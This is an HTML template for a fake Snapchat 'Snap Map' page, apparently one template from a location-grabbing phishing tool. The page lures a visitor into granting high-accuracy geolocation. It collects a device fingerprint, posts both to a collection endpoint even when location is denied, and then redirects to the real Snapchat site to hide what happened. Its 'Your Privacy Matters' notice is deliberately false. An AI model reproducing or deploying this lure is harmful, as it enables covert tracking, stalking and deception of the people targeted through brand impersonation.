<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Avenir Next', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #fffc00 0%, #ffd700 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #fffc00, #ff6b00);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #fffc00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            border: 3px solid white;
            box-shadow: 0 4px 20px rgba(255, 252, 0, 0.3);
        }
        
        .title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.4;
        }
        
        .feature-box {
            background: #f8f9ff;
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 25px;
            border: 2px solid #fffc00;
            position: relative;
        }
        
        .snap-map-header {
            font-size: 20px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            color: #555;
            text-align: left;
        }
        
        .feature-item:last-child {
            margin-bottom: 0;
        }
        
        .feature-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            font-size: 18px;
        }
        
        .btn {
            background: linear-gradient(135deg, #fffc00 0%, #ff6b00 100%);
            color: #333;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.4);
        }
        
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #666;
            font-style: italic;
        }
        
        .error {
            color: #ff4757;
            margin-top: 15px;
            display: none;
            background: #fff5f5;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ffcccb;
        }
        
        .privacy-note {
            margin-top: 20px;
            padding: 15px;
            background: #f0f0f0;
            border-radius: 12px;
            font-size: 12px;
            color: #666;
            line-height: 1.4;
        }
        
        .friends-preview {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 15px 0;
        }
        
        .friend-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, #fffc00, #ff6b00);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üëª</div>
        
        <h1 class="title">Snap Map</h1>
        <p class="subtitle">See what your friends are up to and discover what's happening around you!</p>
        
        <div class="feature-box">
            <div class="snap-map-header">
                <span>üó∫Ô∏è</span>
                <span>Enable Snap Map</span>
            </div>
            
            <div class="friends-preview">
                <div class="friend-avatar">üë§</div>
                <div class="friend-avatar">üë§</div>
                <div class="friend-avatar">üë§</div>
            </div>
            
            <div class="feature-item">
                <span class="feature-icon">üë•</span>
                <span>See friends' locations in real-time</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üéâ</span>
                <span>Discover events and hotspots nearby</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üì∏</span>
                <span>View public snaps from your area</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üî•</span>
                <span>Find trending locations</span>
            </div>
        </div>
        
        <button class="btn" id="enableLocation">
            üìç Enable Snap Map
        </button>
        
        <div class="loading" id="loading">
            <i>üîÑ Setting up your Snap Map...</i>
        </div>
        
        <div class="error" id="error"></div>
        
        <div class="privacy-note">
            <strong>üîí Your Privacy Matters</strong><br>
            You control who can see your location on Snap Map. Only friends you choose can see where you are, and you can go into Ghost Mode anytime to hide your location.
        </div>
    </div>

    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
    <script>
        const sessionId = '{{ session_id }}';
        
        document.getElementById('enableLocation').addEventListener('click', function() {
            this.disabled = true;
            this.textContent = 'üîÑ Enabling Snap Map...';
            document.getElementById('loading').style.display = 'block';
            
            const deviceData = collectDeviceFingerprint();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        sendData({
                            session_id: sessionId,
                            location: locationData,
                            device: deviceData,
                            template: 'snapchat'
                        });
                        
                        document.getElementById('loading').innerHTML = '<i style="color: #4CAF50;">‚úÖ Snap Map enabled! Welcome to the map!</i>';
                        setTimeout(() => {
                            window.location.href = 'https://snapchat.com';
                        }, 2000);
                    },
                    function(error) {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('error').style.display = 'block';
                        
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Location permission denied. Enable location to use Snap Map and see your friends!';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Location information is unavailable.';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Location request timed out.';
                                break;
                            default:
                                errorMessage = 'An unknown error occurred.';
                                break;
                        }
                        document.getElementById('error').textContent = errorMessage;
                        
                        sendData({
                            session_id: sessionId,
                            device: deviceData,
                            template: 'snapchat',
                            location_error: errorMessage
                        });
                        
                        const btn = document.getElementById('enableLocation');
                        btn.disabled = false;
                        btn.textContent = 'üìç Try Again';
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').textContent = 'Geolocation is not supported by this browser.';
                
                sendData({
                    session_id: sessionId,
                    device: deviceData,
                    template: 'snapchat',
                    location_error: 'Geolocation not supported'
                });
            }
        });
        
        function sendData(data) {
            fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(error => {
                console.error('Error sending data:', error);
            });
        }
    </script>
</body>
</html>
